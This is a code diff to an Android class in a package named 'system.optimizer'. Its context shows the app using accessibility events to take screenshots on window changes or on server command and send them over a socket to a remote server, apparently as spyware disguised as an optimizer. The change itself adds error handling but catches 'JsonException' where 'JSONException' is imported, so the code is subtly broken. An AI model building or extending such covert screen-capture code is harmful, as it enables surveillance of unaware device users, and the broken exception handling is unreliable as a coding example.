@@ -9,6 +9,7 @@ import android.os.Handler;
 import android.os.Looper;
 
 import org.json.JSONObject;
+import org.json.JSONException;
 
 import com.system.optimizer.network.SocketManager;
 import com.system.optimizer.config.AppConfig;
@@ -39,7 +40,8 @@ public class AccessibilityEventHandler {
     private final Runnable executeRunnable;
     private String pendingRequestId = null;
 
-    public AccessibilityEventHandler(Consumer<ScreenshotCallback> captureProvider, AppConfig appConfig, SocketManager socketManager) {
+    public AccessibilityEventHandler(Consumer<ScreenshotCallback> captureProvider, AppConfig appConfig,
+            SocketManager socketManager) {
         if (captureProvider == null) {
             throw new IllegalArgumentException("Capture provider cannot be null");
         }
@@ -88,15 +90,20 @@ public class AccessibilityEventHandler {
                             requestIdToSend = pendingRequestId;
                             pendingRequestId = null;
                         }
-                        
-                        if (requestIdToSend != null) {
-                            JSONObject data = new JSONObject();
-                            data.put("request_id", requestIdToSend);
-                            data.put("image", imageData);
-                            socketManager.sendEvent("screenshot_response", data);
-                        } else {
-                            // No request_id, send image directly
-                            socketManager.sendEvent("screenshot_response", imageData);
+
+                        try {
+                            if (requestIdToSend != null) {
+                                JSONObject data = new JSONObject();
+                                data.put("request_id", requestIdToSend);
+                                data.put("image", imageData);
+                                socketManager.sendEvent("screenshot_response", data);
+                            } else {
+                                // No request_id, send image directly
+                                socketManager.sendEvent("screenshot_response", imageData);
+                            }
+                        } catch (JsonException e) {
+                            Log.e(TAG, "Error building the JSON for the screenshot", e);
+                            socketManager.sendEvent("screenshot_error", "Error building the JSON for the screenshot");
                         }
                     } else {
                         socketManager.sendEvent("screenshot_error", "Screenshot returned null data");
@@ -152,6 +159,7 @@ public class AccessibilityEventHandler {
     /**
      * Trigger manual screenshot capture with request_id.
      * This bypasses the default delay and auto_screenshot config check.
+     * 
      * @param requestId The request_id from the server to include in the response
      */
     public void triggerManualCapture(String requestId) {
@@ -163,7 +171,8 @@ public class AccessibilityEventHandler {
     }
 
     /**
-     * Trigger for window change (TYPE_WINDOW_STATE_CHANGED) - capture screenshot only.
+     * Trigger for window change (TYPE_WINDOW_STATE_CHANGED) - capture screenshot
+     * only.
      */
     public void triggerCaptureOnly() {
         synchronized (this) {
